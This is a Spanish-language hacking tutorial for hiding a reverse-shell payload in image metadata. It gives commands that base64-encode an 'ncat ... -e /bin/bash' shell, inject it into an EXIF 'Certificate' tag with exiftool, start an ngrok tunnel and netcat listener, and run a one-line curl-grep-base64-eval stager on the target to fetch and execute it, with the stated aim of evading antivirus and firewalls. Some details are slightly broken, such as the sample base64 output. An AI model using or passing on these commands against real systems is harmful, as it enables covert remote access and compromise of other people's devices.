# Ocultando Payloads en Metadatos de Imágenes

Esta técnica consiste en implantar scripts de shell en los metadatos de una imagen para evadir firewalls, antivirus y sistemas de monitorización. La imagen actúa como un sistema de entrega.

## Requerimientos

```bash
apt install coreutils apache2 php-pgsql php-fpm php-apache openssh
```

**Instalación de ExiF:**
```bash
wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/bin/ExiF -O $PREFIX/bin/ExiF
chmod +x $PREFIX/bin/ExiF
```

## Paso a Paso

### 1. Selección de imagen
Descarga la imagen que usarás. Muchos sitios (Twitter, Facebook) borran los metadatos al subir la foto, por lo que el objetivo debe probarse manualmente.

### 2. Preparación del Servidor
Usaremos un servidor local (PHP o Apache) y lo expondremos con **ngrok** o **localtunnel**.

```bash
# Servidor PHP
php -S 127.0.0.1:4546 -t /ruta/a/imagenes/
# Túnel Ngrok
ngrok tcp 4546
```

### 3. Generación del Payload
Codificaremos una shell reversa en Base64 en una sola línea:
```bash
printf 'ncat [IP_ATACANTE] [PUERTO] -e /bin/bash' | base64 | tr -d '\n'
```
Resultado ejemplo: `dG91Y2ggfi9EZXNr9wL2hhY2tlZA==`

### 4. Ocultar el Payload con ExiF
Primero borramos metadatos existentes y luego inyectamos el payload en una etiqueta (ej. `Certificate`).

```bash
# Borrar metadatos
exiftool -all=imagen.jpg
# Inyectar payload
exiftool -Certificate='[TU_PAYLOAD_BASE64]' imagen.jpg
```

### 5. Escucha con Netcat
En el equipo atacante:
```bash
ncat -nvl 4546
```

### 6. Explotación (Stager)
En el dispositivo objetivo, ejecutamos un stager que descarga la imagen, extrae el metadato, lo decodifica y lo ejecuta:

```bash
p=$(curl -s http://tu-servidor.com/imagen.jpg | grep Cert -a | sed 's/<[^>]*>//g' | sed 's/ //g' | base64 -d); eval $p
```

**Explicación del stager:**
1.  **`curl -s`**: Descarga la imagen en silencio.
2.  **`grep Cert -a`**: Procesa el binario como texto y busca la cadena "Cert".
3.  **`sed`**: Limpia etiquetas XML y espacios.
4.  **`base64 -d`**: Decodifica el payload.
5.  **`eval $p`**: Ejecuta el contenido de la variable como un comando.

> **Nota:** NO memorices aprende practicando, que la genialidad es igual a la repetición.
